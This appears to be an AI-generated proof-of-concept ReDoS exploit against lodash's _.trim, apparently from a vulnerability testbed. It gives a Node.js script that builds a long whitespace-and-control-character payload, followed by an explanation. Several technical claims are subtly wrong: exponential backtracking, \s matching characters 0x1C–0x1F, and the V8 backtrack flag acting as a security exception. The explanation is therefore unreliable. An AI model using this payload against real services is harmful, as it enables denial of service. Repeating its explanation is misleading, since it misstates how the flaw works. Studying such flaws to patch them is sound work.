const _ = require('lodash');

async function exploit() {
  // The vulnerable lodash versions (prior to the patch) use /^\\s+|\\s+$/g in _.trim and _.toNumber.
  // This regex triggers catastrophic backtracking on long inputs consisting of \\s-matching 
  // characters followed by a non-matching character. The alternation | combined with greedy + 
  // quantifiers creates overlapping NFA paths that scale exponentially.

  // Construct payload using multiple Unicode whitespace characters that overlap in the \\s class.
  // This maximizes ambiguous matching boundaries for legacy V8 regex engines.
  const wsChars = [0x20, 0x09, 0x0D, 0x0A, 0x1C, 0x1D, 0x1E, 0x1F]; // Standard & control \\s matches
  let maliciousInput = '';

  // Repeat characters to create ambiguous boundaries.
  // Backtracking steps grow non-linearly; >350 chars reliably exceeds the 30k threshold.
  for (let i = 0; i < 400; i++) {
    maliciousInput += String.fromCharCode(wsChars[i % wsChars.length]);
  }

  // Append a hard non-whitespace character to force backtracking from the trailing anchor ($)
  // after the engine consumes leading whitespace via the ^\\s+ alternation.
  maliciousInput += '\x01';

  console.log('Invoking _.trim with crafted ReDoS payload...');

  // This call directly exercises the vulnerable string.replace(reTrim, '') path.
  // In a patched environment, this executes in <1ms.
  // With the vulnerability present and --regexp-backtracks-before-fallback=30000 enabled,
  // Node.js will either saturate CPU cycles or throw a backtrack-limit exception.
  return _.trim(maliciousInput);
}

await exploit();
```

### Why This Demonstrates the Vulnerability

1. **Root Cause**: The pre-patched `lodash` implementation relies on `/^\s+|\s+$/g` to strip whitespace. In older V8/Node.js regex engines, `\s` matches a wide range of Unicode whitespace code points. When the input contains a long sequence of these overlapping characters followed by a non-matching character, the engine's NFA (Nondeterministic Finite Automaton) compilation creates multiple valid paths for each position due to the alternation `|` and greedy quantifiers `+`.
2. **Exponential Backtracking**: As the regex engine tries to satisfy `^\s+`, it consumes characters greedily, hits `\x01`, fails the alternation, and backtracks step-by-step trying `\s+$`. Each character in the input can double the number of theoretical paths explored by the naive backtracking algorithm. With 400 mixed whitespace characters, the backtrack count quickly surpasses `30,000`.
3. **Observable Impact**: Under the testbed's `--regexp-backtracks-before-fallback=30000` flag, exceeding this limit triggers a security mechanism in Node.js. The exception propagates (as unhandled) or causes severe CPU saturation/timeout, visibly confirming that untrusted input can cause a Denial of Service via ReDoS. Patched versions replace the regex with iterative character scanning (`trimmedEndIndex` loop), eliminating the backtracking path entirely and restoring O(n) performance regardless of input length.

